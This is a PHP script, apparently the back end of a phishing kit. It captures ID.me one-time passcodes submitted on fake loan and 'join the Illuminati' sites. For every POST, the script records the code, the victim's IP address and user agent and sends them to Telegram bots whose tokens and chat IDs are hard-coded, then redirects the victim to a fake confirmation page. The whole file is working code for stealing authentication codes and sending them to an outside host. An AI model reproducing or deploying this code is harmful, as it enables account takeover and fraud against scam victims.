<?php
ob_start();

// Site-specific configuration with domain-based bots and redirects
$site_map = [
    'upstartloan.rf.gd' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
        ],
        'redirect' => 'https://upstartloan.rf.gd/cache_site/processing.html'
    ],

    'illuminatigroup.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8459891488:AAHBwkSpyaRAtGCI6yWm_-39c61LJhQgI4w', 'chat_id' => '5978851707'],
        ],
        "redirect" => "https://illuminatigroup.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    'illuminatiglobal.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8572613269:AAEMx8dbCNQnUHfKtZ5kuhpVfjE6fBdhofw', 'chat_id' => '6512010552'],
        ],
        "redirect" => "https://illuminatiglobal.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    'illuminatinetwork.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8233162319:AAGUMse4WldCYNsGerfsU2FDnmY-_Heo-yM', 'chat_id' => '6944000447'],
        ],
        "redirect" => "https://illuminatinetwork.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    'illuminaticonnect.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
        ],
        "redirect" => "https://illuminaticonnect.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],
];

// Get the referring domain
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';

// Find the configuration for this domain
$config = $site_map[$domain] ?? null;

// If no config found, use a default one
if (!$config) {
    $config = reset($site_map);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Setup log file
    $log_file = __DIR__ . "/logs/idme_otp_confirms.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    // Logging function
    function log_entry($msg) {
        global $log_file;
        $timestamp = date("Y-m-d H:i:s");
        file_put_contents($log_file, "[$timestamp] $msg\n", FILE_APPEND);
    }

    // Get form data from HTML form - field name is 'otpconfirm'
    $otpconfirm = htmlspecialchars($_POST['otpconfirm'] ?? '???');

    // Get IP address SERVER-SIDE
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    // Handle multiple IPs in X_FORWARDED_FOR
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }

    $timestamp = date("Y-m-d H:i:s");
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Prepare Telegram message
    $message = "✅ *ID.me OTP Confirmation*\n\n" .
               "🔒 *Confirm OTP Code:* `$otpconfirm`\n" .
               "🌐 *Domain:* $domain\n" .
               "📡 *IP:* `$ip`\n" .
               "🕒 *Time:* $timestamp\n" .
               "🔍 *User Agent:* " . substr($user_agent, 0, 100);

    // Send to Telegram bots (using domain-specific bots from config)
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            log_entry("Skipping bot $bot_index - empty token or chat_id");
            continue;
        }
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => true
        ]);
        
        $result = curl_exec($ch);
        
        if (curl_error($ch)) {
            log_entry("❌ Telegram error (bot $bot_index): " . curl_error($ch));
        } else {
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            log_entry("✓ Telegram sent (bot $bot_index) - HTTP $http_code");
        }
        
        curl_close($ch);
    }

    // Log the submission
    log_entry("[$domain] OTP Confirm from $ip - Code: $otpconfirm");

    // Clear output buffer and redirect to domain-specific URL
    ob_end_clean();
    header("Location: " . $config['redirect']);
    exit;
    
} else {
    // Not a POST request
    echo "This page only accepts POST submissions from the OTP confirmation form.";
    exit;
}
?>
